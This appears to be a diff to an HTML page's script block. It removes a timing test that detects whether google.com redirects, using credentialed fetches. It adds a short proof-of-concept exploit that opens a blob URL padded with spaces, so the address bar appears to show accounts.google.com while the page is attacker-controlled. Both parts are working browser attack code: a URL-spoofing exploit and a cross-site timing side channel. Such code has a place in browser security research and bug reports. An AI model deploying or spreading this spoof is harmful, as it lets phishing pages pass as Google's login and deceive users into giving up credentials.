@@ -1,31 +1,7 @@
 <script>
-    (async () => {
-        const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
-        async function isRedirect (url1) {
-            const startTime = performance.now();
-            const a = await fetch(url1, { 'mode': 'no-cors', credentials: 'include', cache: 'no-store' });
-            const endTime = performance.now();
-            const timeTaken = endTime - startTime;
-            await sleep(1000);
-            const performanceEntry = performance.getEntriesByName(url1)[0];
-            const reportedDuration = performanceEntry.duration;
-            console.log(`Time taken for ${url1} to load: ${timeTaken}`);
-            console.log(`Reported time taken for ${url1} to load: ${reportedDuration}`);
-            // console.log(performanceEntry);
-            if ( (timeTaken - reportedDuration) > 5 ) {
-                console.log(`${url1} is a redirect?`);
-                return true;
-            } else {
-                console.log(`${url1} is not a redirect`);
-                return false;
-            }
-        }
-        const url1 = 'https://google.com/';
-        const url2 = 'https://www.google.com/';
-        console.log('Starting test');
-        await isRedirect(url1);
-        await isRedirect(url2);
-        console.log('Finished test');
-        
-    })();
+var exp = 'FAKE GOOGLE<script>history.replaceState("","","blob:'+location.protocol+'//accounts.google.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';
+location=URL.createObjectURL(new Blob([exp], {type: "text/html"}))
 </script>
+
+
+
